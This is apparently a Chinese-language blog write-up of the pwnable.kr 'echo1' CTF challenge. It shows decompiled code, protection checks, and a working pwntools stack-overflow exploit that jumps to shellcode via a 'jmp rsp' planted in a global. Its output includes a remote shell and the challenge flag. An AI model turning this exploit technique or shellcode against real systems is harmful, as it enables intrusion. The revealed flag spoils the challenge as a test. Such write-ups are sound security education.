---
title: pwnable.kr-echo1
date: 2018-03-06 14:00:30
tags: [pwnable.kr,PWN]
categories: CTF
---
# 前言
简单的栈溢出题目。
# 分析
先分析反编译的代码
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int *v3; // rsi@1
  _QWORD *v4; // rax@1
  int v6; // [sp+Ch] [bp-24h]@1
  _QWORD v7[4]; // [sp+10h] [bp-20h]@1

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  o = malloc(0x28uLL);
  *((_QWORD *)o + 3) = greetings;
  *((_QWORD *)o + 4) = byebye;
  printf("hey, what's your name? : ", 0LL);
  v3 = (int *)v7;
  __isoc99_scanf("%24s", v7);
  v4 = o;
  *(_QWORD *)o = v7[0];
  v4[1] = v7[1];
  v4[2] = v7[2];
  id = v7[0];
  getchar();
  func[0] = (__int64)echo1;
  qword_602088 = (__int64)echo2;
  qword_602090 = (__int64)echo3;
  v6 = 0;
  do
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts("\n- select echo type -");
        puts("- 1. : BOF echo");
        puts("- 2. : FSB echo");
        puts("- 3. : UAF echo");
        puts("- 4. : exit");
        printf("> ", v3);
        v3 = &v6;
        __isoc99_scanf("%d", &v6);
        getchar();
        if ( (unsigned int)v6 > 3 )
          break;
        ((void (__fastcall *)(const char *, int *))func[(unsigned __int64)(unsigned int)(v6 - 1)])("%d", &v6);
      }
      if ( v6 == 4 )
        break;
      puts("invalid menu");
    }
    cleanup("%d", &v6);
    printf("Are you sure you want to exit? (y/n)");
    v6 = getchar();
  }
  while ( v6 != 121 );
  puts("bye");
  return 0;
}
```
```c
__int64 echo1()
{
  char s; // [sp+0h] [bp-20h]@1

  (*((void (__fastcall **)(_QWORD))o + 3))(o);
  get_input(&s, 128);
  puts(&s);
  (*((void (__fastcall **)(_QWORD, _QWORD))o + 4))(o, 128LL);
  return 0LL;
}
```
程序主要逻辑是给出三个选项，每个选项都会执行一个`echo`函数，但是本题只实现了第一个`echo`函数。
分析`echo1`函数可以发现，它存在栈溢出漏洞。再看看保护
```bash
root@1:~/桌面/test$ checksec echo1
[*] '/root/\xe6\xa1\x8c\xe9\x9d\xa2/test/echo1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

```
思路是在栈上布置`shellcode`然后跳转到此处执行。但是程序没有泄漏地址的地方，这里观察到main函数中`id`变量被赋予了`v7[0]`，而这里的内容是可以控制的（他就是`name`的前8字节）。于是可以通过在`id`中写入`jmp rsp`的指令来跳转到`shellcode`处执行。下面是exp
```python
from pwn import *

def work(DEBUG):
    context(arch='amd64',os='linux',log_level='info')
    if DEBUG:
        r = process('./echo1')
    else:
        r = remote('pwnable.kr',9010)
    
    id_addr = 0x6020a0
    
    r.recvuntil(' : ')
    r.sendline(asm('jmp rsp'))
    r.recvuntil('> ')
    r.sendline('1')
    r.sendline('a'*0x28+p64(id_addr)+asm(shellcraft.sh()))
    r.interactive()

work(False)
```
```bash
root@1:~/桌面/test$ python 1.py 
[+] Opening connection to pwnable.kr on port 9010: Done
[*] Switching to interactive mode
hello \xff�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xa0 `
goodbye \xff�
$ 
$ ls
echo1
flag
log
super.pl
$ cat flag
H4d_som3_fun_w1th_ech0_ov3rfl0w
$  

```
# 总结
简单的栈溢出利用